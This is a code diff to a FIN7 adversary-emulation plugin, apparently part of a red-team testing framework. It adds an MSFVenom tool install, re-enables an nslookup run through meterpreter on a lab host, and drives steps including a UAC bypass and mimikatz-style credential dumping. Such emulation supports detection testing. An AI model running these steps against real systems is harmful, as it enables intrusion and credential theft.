@@ -128,6 +128,9 @@ class FIN7Plugin(AttackPlugin):
         # -f C                : output is c code
         # --encrypt xor       : xor encrypt the results
         # --encrypt-key m     : the encryption key
+
+        self.attacker_machine_plugin.remote_run("sudo apt install msfpc")  # MSFVenom needs to be installed
+
         venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
         venom.generate_and_deploy(payload=self.payload_type_1,
                                   architecture="x64",
@@ -179,11 +182,10 @@ class FIN7Plugin(AttackPlugin):
             f"{CommandlineColors.OKCYAN}Execute arp through meterpreter{CommandlineColors.ENDC}", 1)
         print(metasploit.meterpreter_execute_on(["arp"], hotelmanager))
         # powershell: nslookup to query domain controler(hoteldc) for ip from ARP (Caldera ?) https://attack.mitre.org/techniques/T1018/
-        # TODO: Add real <itadmin> ip. Re-activate. This command caused trouble afterwards (uploading mimikatz). Maybe it is because of an error
-        # itadmin = "127.0.0.1"
-        # self.attack_logger.vprint(
-        #    f"{CommandlineColors.OKCYAN}Execute nslookup through meterpreter{CommandlineColors.ENDC}", 1)
-        # print(metasploit.meterpreter_execute_on([f"execute -f nslookup.exe -H -i -a '{itadmin}'"], hotelmanager))
+        # TODO: Add a new machine in config as <itadmin> ip. Re-activate. This command caused trouble afterwards (uploading mimikatz). Maybe it is because of an error
+        itadmin = self.get_target_by_name("itadmin")
+        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute nslookup through meterpreter{CommandlineColors.ENDC}", 1)
+        print(metasploit.meterpreter_execute_on([f"execute -f nslookup.exe -H -i -a '{itadmin}'"], hotelmanager))
 
         # Copy step 5 attack tools to attacker
 
@@ -215,7 +217,6 @@ class FIN7Plugin(AttackPlugin):
             self.attack_logger.vprint(
                 f"{CommandlineColors.OKCYAN}Execute UAC bypass (and mimikatz) through meterpreter{CommandlineColors.ENDC}", 1)
             print(metasploit.meterpreter_execute_on([execute_samcats], hotelmanager, delay=20))
-            # TODO: Make it more reliable. Also test which OS versions are working properly. It worked at least once
 
         # samcat.exe: reads local credentials https://attack.mitre.org/techniques/T1003/001/
 
@@ -313,8 +314,8 @@ class FIN7Plugin(AttackPlugin):
         self.step1()
         self.step2()
         self.step3()  # Done and works
-        self.step4()
-        self.step5()
+        self.step4()  # Partial - with a hack
+        self.step5()  # Done and quite ok
         self.step6()
         self.step7()
         self.step8()
